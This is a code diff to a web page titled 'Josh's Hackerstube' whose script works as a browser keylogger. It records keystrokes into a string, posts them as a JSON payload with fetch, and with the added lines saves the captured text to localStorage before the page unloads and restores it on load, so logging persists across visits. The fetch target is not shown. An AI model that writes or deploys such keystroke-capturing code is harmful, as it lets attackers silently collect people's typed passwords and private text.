@@ -6,14 +6,19 @@
 </head>
 
 <body>
+  <h1>Josh's Hackerstube</h1>
 
   <script type="text/javascript">
       let sentence = "";
       let text = "";
 
       let bodyTemplate = {
-        "keyword": "[Josh's Hackerstube]",
+        "keyword": "Josh's Hackerstube",
         "payload": ""
+      }
+
+      window.onload = e => {
+          sentence = window.localStorage.getItem('loggedData');
       }
 
       document.onkeydown = e => {
@@ -65,6 +70,11 @@
             body: JSON.stringify(bodyTemplate)
           })
           .then(response => response.json());
+          window.localStorage.clear();
+      }
+
+      window.onbeforeunload = e => {
+          window.localStorage.setItem('loggedData', sentence);
       }
   </script>
 </body>
